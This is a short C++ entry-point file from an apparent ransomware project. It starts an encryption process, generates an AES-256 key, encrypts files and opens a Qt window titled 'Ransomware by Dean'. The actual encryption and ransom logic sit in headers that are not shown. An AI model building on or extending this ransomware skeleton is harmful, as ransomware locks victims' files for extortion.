//
// Created by prang on 25.09.2024.
//

#include <iostream>
#include <QApplication>
#include "gui/mainwindow.h"
#include "logic/encryptor.h"
#include "utils/CryptoAes256.h"
#include "utils/KeyUtils.h"

int main(int argc, char *argv[]) {
  QApplication app(argc, argv);

  auto encryptor = new Encrypt();
  encryptor->startEncryptionProcess();
  delete encryptor;

  KeyUtils keyUtils;
  CryptoAes256 cryptoAes256;
  KeyIvAES keyIvAes = keyUtils.generateKeyIv(32);
  cryptoAes256.encryptSaveFile();

  RansomWindow ransomWindow;
  ransomWindow.setWindowTitle("Ransomware by Dean");
  ransomWindow.setFixedSize(600, 400);
  ransomWindow.show();

  return app.exec();
}
